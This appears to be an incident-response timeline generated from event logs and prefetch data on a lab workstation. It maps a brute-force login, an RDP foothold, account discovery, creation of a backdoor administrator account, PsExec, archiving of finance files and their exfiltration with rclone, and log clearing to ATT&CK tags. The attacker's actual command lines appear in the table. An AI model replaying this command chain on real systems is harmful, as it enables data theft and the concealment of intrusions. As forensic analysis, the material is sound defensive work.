# Investigation timeline

25 events, 19 tagged. All times UTC.

> Rows marked `*` had no timezone in the source; the `--evtx-tz` assumption was applied. Verify against the host's configured timezone.

| Time (UTC) | Host | Source | Summary | Tags |
|---|---|---|---|---|
| 2026-03-13T15:02:11Z | WS-FIN-07.lab.example | prefetch | CHROME.EXE executed (previous run; run count 48) |  |
| 2026-03-13T18:20:31Z | WS-FIN-07.lab.example | prefetch | CHROME.EXE executed (previous run; run count 48) |  |
| 2026-03-13T21:44:09Z | WS-FIN-07.lab.example | prefetch | CHROME.EXE executed (last run; run count 48) |  |
| 2026-03-14T06:30:02Z | WS-FIN-07.lab.example | evtx | Successful logon (service) for SYSTEM |  |
| 2026-03-14T06:58:04Z | WS-FIN-07.lab.example | evtx | Failed logon for administrator from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T06:58:31Z | WS-FIN-07.lab.example | evtx | Failed logon for admin from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T06:59:10Z | WS-FIN-07.lab.example | evtx | Failed logon for jsmith from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T06:59:44Z | WS-FIN-07.lab.example | evtx | Failed logon for svc_backup from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T07:00:20Z | WS-FIN-07.lab.example | evtx | Failed logon for backup from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T07:01:02Z | WS-FIN-07.lab.example | evtx | Failed logon for svc_backup from 203.0.113.45 | `brute-force:T1110` |
| 2026-03-14T07:02:15Z | WS-FIN-07.lab.example | evtx | Failed logon for mlee from 10.10.4.22 |  |
| 2026-03-14T07:03:12Z | WS-FIN-07.lab.example | evtx | Successful logon (remote-interactive (RDP)) for svc_backup from 203.0.113.45 | `rdp-logon:T1021.001` |
| 2026-03-14T07:05:40Z* | WS-FIN-07.lab.example | evtx | Process created: C:\Windows\System32\cmd.exe \| cmd.exe /c whoami /all | `discovery:T1033/T1087` |
| 2026-03-14T07:05:41Z | WS-FIN-07.lab.example | prefetch | WHOAMI.EXE executed (last run; run count 1) |  |
| 2026-03-14T07:06:10Z* | WS-FIN-07.lab.example | evtx | Process created: C:\Windows\System32\net.exe \| net group "Domain Admins" /domain | `discovery:T1033/T1087` |
| 2026-03-14T07:09:00Z | WS-FIN-07.lab.example | evtx | User account created: helpdesk_tmp | `persistence:T1136.001` |
| 2026-03-14T07:09:30Z | WS-FIN-07.lab.example | evtx | Member added to security-enabled local group: helpdesk_tmp -> Administrators | `privilege:T1098` |
| 2026-03-14T07:12:00Z | WS-FIN-07.lab.example | evtx | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) | `persistence:T1543.003` |
| 2026-03-14T07:12:02Z | WS-FIN-07.lab.example | prefetch | PSEXESVC.EXE executed (last run; run count 1) | `lateral-movement:T1569.002` |
| 2026-03-14T07:18:10Z | WS-FIN-07.lab.example | evtx | Process created: C:\Users\Public\7z.exe \| 7z.exe a -pInfected C:\Users\Public\f.7z C:\Finance\* | `archive:T1560.001` |
| 2026-03-14T07:18:11Z | WS-FIN-07.lab.example | prefetch | 7Z.EXE executed (last run; run count 1) | `archive:T1560.001` |
| 2026-03-14T07:22:40Z | WS-FIN-07.lab.example | prefetch | RCLONE.EXE executed (previous run; run count 2) | `exfil-tool:T1567.002` |
| 2026-03-14T07:31:04Z | WS-FIN-07.lab.example | evtx | Process created: C:\Users\Public\rclone.exe \| rclone.exe copy C:\Users\Public\f.7z remote:bkp --transfers 8 | `exfil-tool:T1567.002` |
| 2026-03-14T07:31:05Z | WS-FIN-07.lab.example | prefetch | RCLONE.EXE executed (last run; run count 2) | `exfil-tool:T1567.002` |
| 2026-03-14T07:48:55Z | WS-FIN-07.lab.example | evtx | Security audit log was cleared | `defense-evasion:T1070.001` |
